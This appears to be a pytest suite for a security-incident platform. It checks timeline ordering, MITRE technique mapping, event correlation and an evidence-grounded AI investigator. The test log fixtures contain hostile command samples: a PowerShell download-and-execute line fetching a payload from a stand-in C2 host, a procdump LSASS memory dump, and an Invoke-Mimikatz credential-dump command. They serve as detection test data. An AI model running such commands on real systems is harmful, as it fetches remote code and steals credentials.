from datetime import datetime, timezone, timedelta
import pytest

from app.models.schemas import SecurityEvent, Incident
from app.modules.timeline.service import AttackTimelineService
from app.modules.mitre.service import MitreMappingService
from app.modules.investigation.evidence_builder import StructuredEvidenceBuilder
from app.modules.investigation.providers.synthesizer import RuleGroundedEvidenceSynthesizer
from app.modules.investigation.providers.llm import LLMInvestigatorProvider
from app.modules.investigation.service import EvidenceGroundedAIInvestigationService
from app.modules.ingestion.service import LogIngestionService
from app.modules.correlation.service import EventCorrelationService
from app.db.repository import security_event_repo, incident_repo


def test_chronological_timeline_generation(db):
    timeline_svc = AttackTimelineService()

    now = datetime.now(timezone.utc)
    # Event 1: Earlier timestamp
    e1 = SecurityEvent(
        event_id="evt-tl-01",
        timestamp=now - timedelta(minutes=15),
        source="windows_security",
        host="FINANCE-PC01",
        user="admin",
        event_type="authentication_success",
        severity="INFO",
        raw_data={"Computer": "FINANCE-PC01", "TargetUserName": "admin"},
    )
    # Event 2: Later timestamp
    e2 = SecurityEvent(
        event_id="evt-tl-02",
        timestamp=now,
        source="powershell",
        host="FINANCE-PC01",
        user="admin",
        event_type="powershell_encoded_command",
        severity="HIGH",
        raw_data={"CommandLine": "powershell.exe -Enc ABC..."},
    )

    security_event_repo.save(db, e1)
    security_event_repo.save(db, e2)

    inc = Incident(
        id="inc-test-tl",
        title="Test Incident",
        severity="HIGH",
        status="OPEN",
        event_ids=["evt-tl-02", "evt-tl-01"],  # In reverse order in incident model
    )
    incident_repo.save(db, inc)

    # Build timeline
    timeline = timeline_svc.build_timeline(db, "inc-test-tl")

    assert len(timeline) == 2
    # Verify chronological sequence
    assert timeline[0].source_event_id == "evt-tl-01"
    assert timeline[1].source_event_id == "evt-tl-02"
    assert timeline[0].sequence == 0
    assert timeline[1].sequence == 1
    assert "FINANCE-PC01" in timeline[0].title


def test_mitre_mapping_observed_vs_inferred(db):
    mitre_svc = MitreMappingService()

    now = datetime.now(timezone.utc)
    # Event 1: Explicit attack_id T1059.001 (observed)
    e1 = SecurityEvent(
        event_id="evt-mitre-01",
        timestamp=now,
        source="powershell",
        host="DC01",
        event_type="powershell_script_execution",
        severity="HIGH",
        attack_id="T1059.001",
        raw_data={"ScriptBlockText": "Invoke-Expression $c"},
    )
    # Event 2: LSASS Memory Dump behavior without explicit attack_id (inferred)
    e2 = SecurityEvent(
        event_id="evt-mitre-02",
        timestamp=now + timedelta(minutes=5),
        source="edr",
        host="DC01",
        event_type="edr_credential_dumping",
        severity="CRITICAL",
        raw_data={"process_name": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe"},
    )

    security_event_repo.save(db, e1)
    security_event_repo.save(db, e2)

    inc = Incident(
        id="inc-test-mitre",
        title="Test MITRE Incident",
        severity="CRITICAL",
        status="OPEN",
        event_ids=["evt-mitre-01", "evt-mitre-02"],
    )
    incident_repo.save(db, inc)

    mappings = mitre_svc.map_incident_techniques(db, "inc-test-mitre")
    map_dict = {m["technique_id"]: m for m in mappings}

    # Verify T1059.001 is OBSERVED
    assert "T1059.001" in map_dict
    assert map_dict["T1059.001"]["evidence_nature"] == "observed"
    assert "evt-mitre-01" in map_dict["T1059.001"]["supporting_event_ids"]

    # Verify T1003.001 is INFERRED
    assert "T1003.001" in map_dict
    assert map_dict["T1003.001"]["evidence_nature"] == "inferred"
    assert "evt-mitre-02" in map_dict["T1003.001"]["supporting_event_ids"]


def test_structured_evidence_package_and_ai_investigation(db):
    ingest_svc = LogIngestionService()
    corr_svc = EventCorrelationService()
    inv_svc = EvidenceGroundedAIInvestigationService()

    now_str = "2026-09-12T02:00:00Z"
    logs = [
        {
            "source": "powershell",
            "EventID": 4104,
            "TimeCreated": now_str,
            "Computer": "PROD-SERVER-01",
            "UserId": "admin_user",
            "ScriptBlockText": "powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://c2-node.xyz/payload.ps1')",
            "attack_id": "T1059.001",
        },
        {
            "source": "network",
            "TimeCreated": "2026-09-12T02:05:00Z",
            "SourceIp": "10.0.1.50",
            "Computer": "PROD-SERVER-01",
            "DestinationIp": "185.220.101.5",
            "DestinationPort": 4444,
            "action": "ALLOW",
            "attack_id": "T1071.001",
        },
    ]

    ingest_svc.ingest_batch(db, logs)
    corr_res = corr_svc.run_correlation(db)
    assert corr_res["incidents_created"] >= 1

    target_inc = corr_res["incidents"][0]

    # Run AI Investigation
    res = inv_svc.investigate_incident(db, target_inc.id)
    inv_result = res["investigation"]
    actions = res["recommended_actions"]

    assert inv_result.incident_id == target_inc.id
    assert inv_result.status == "COMPLETED"
    assert inv_result.confidence_score >= 0.80

    # Verify real event IDs appear in findings
    for eid in target_inc.event_ids:
        assert eid in inv_result.summary

    # Verify MITRE techniques are referenced
    assert len(inv_result.mitre_techniques) >= 1

    # Verify response actions generated
    assert len(actions) >= 1
    action_types = [a.action_type for a in actions]
    assert "isolate_host" in action_types or "block_ip" in action_types or "block_domain" in action_types


def test_insufficient_evidence_behavior():
    synthesizer = RuleGroundedEvidenceSynthesizer()

    # Empty evidence package
    empty_pkg = {
        "incident": {"id": "inc-empty", "title": "Empty Incident", "severity": "LOW"},
        "timeline": [],
        "mitre_techniques": [],
        "iocs": [],
        "evidence_items": [],
    }

    inv_result, actions = synthesizer.investigate(empty_pkg)
    assert "Insufficient evidence" in inv_result.summary
    assert inv_result.confidence_score <= 0.20
    assert len(actions) == 0


def test_hallucination_prevention():
    synthesizer = RuleGroundedEvidenceSynthesizer()

    pkg = {
        "incident": {"id": "inc-scope-1", "title": "Test Scope", "severity": "MEDIUM"},
        "timeline": [
            {
                "source_event_id": "evt-real-999",
                "timestamp": "2026-09-12T00:00:00Z",
                "title": "[WINDOWS_SECURITY] Authentication Success on SEC-01",
                "event_type": "authentication_success",
                "description": "Observed authentication on SEC-01 by user alice.",
            }
        ],
        "mitre_techniques": [],
        "iocs": [{"type": "username", "value": "alice"}],
        "evidence_items": [{"id": "ev-100"}],
    }

    inv_result, actions = synthesizer.investigate(pkg)

    # Must contain real event ID
    assert "evt-real-999" in inv_result.summary
    # Must NOT invent malicious C2 or unobserved domains
    assert "malicious" not in inv_result.summary.lower() or "unobserved" in inv_result.summary.lower()
    assert "c2-node.xyz" not in inv_result.summary


def test_llm_provider_fallback_when_unconfigured():
    provider = LLMInvestigatorProvider(api_key=None)
    assert not provider.is_available()

    pkg = {
        "incident": {"id": "inc-llm-1", "title": "Fallback Test", "severity": "HIGH"},
        "timeline": [
            {
                "source_event_id": "evt-fallback-1",
                "timestamp": "2026-09-12T00:00:00Z",
                "title": "[EDR] LSASSDump on HOST-1",
                "event_type": "edr_credential_dumping",
                "description": "Observed procdump lsass.exe",
            }
        ],
        "mitre_techniques": [{"technique_id": "T1003.001", "name": "LSASS Memory", "tactic": "Credential Access", "evidence_nature": "inferred", "supporting_event_ids": ["evt-fallback-1"]}],
        "iocs": [{"type": "process", "value": "procdump.exe"}],
        "evidence_items": [{"id": "ev-fb-1"}],
    }

    # Should execute successfully via fallback without crashing
    inv_result, actions = provider.investigate(pkg)
    assert inv_result.status == "COMPLETED"
    assert "evt-fallback-1" in inv_result.summary


def test_intelligence_api_endpoints(client):
    # 1. Ingest event
    payload = {
        "source": "powershell",
        "EventID": 4104,
        "TimeCreated": "2026-09-12T01:00:00Z",
        "Computer": "API-PC-01",
        "UserId": "admin_api",
        "ScriptBlockText": "Invoke-Mimikatz -DumpCreds",
        "attack_id": "T1003.001",
    }
    client.post("/api/v1/events/ingest", json=payload)

    # 2. Correlate
    res_corr = client.post("/api/v1/correlation/run")
    assert res_corr.status_code == 200
    incidents = client.get("/api/v1/incidents").json()
    assert len(incidents) >= 1
    inc_id = incidents[0]["id"]

    # 3. Test GET /api/v1/incidents/{inc_id}/timeline
    res_tl = client.get(f"/api/v1/incidents/{inc_id}/timeline")
    assert res_tl.status_code == 200
    timeline = res_tl.json()
    assert len(timeline) >= 1
    assert "source_event_id" in timeline[0]

    # 4. Test GET /api/v1/incidents/{inc_id}/mitre
    res_mitre = client.get(f"/api/v1/incidents/{inc_id}/mitre")
    assert res_mitre.status_code == 200
    mappings = res_mitre.json()
    assert len(mappings) >= 1
    assert "evidence_nature" in mappings[0]

    # 5. Test POST /api/v1/incidents/{inc_id}/investigate
    res_inv = client.post(f"/api/v1/incidents/{inc_id}/investigate")
    assert res_inv.status_code == 200
    inv_data = res_inv.json()
    assert "investigation" in inv_data
    assert "recommended_actions" in inv_data

    # 6. Test GET /api/v1/incidents/{inc_id}/investigation
    res_get_inv = client.get(f"/api/v1/incidents/{inc_id}/investigation")
    assert res_get_inv.status_code == 200
    get_inv_data = res_get_inv.json()
    assert get_inv_data["investigation"]["incident_id"] == inc_id
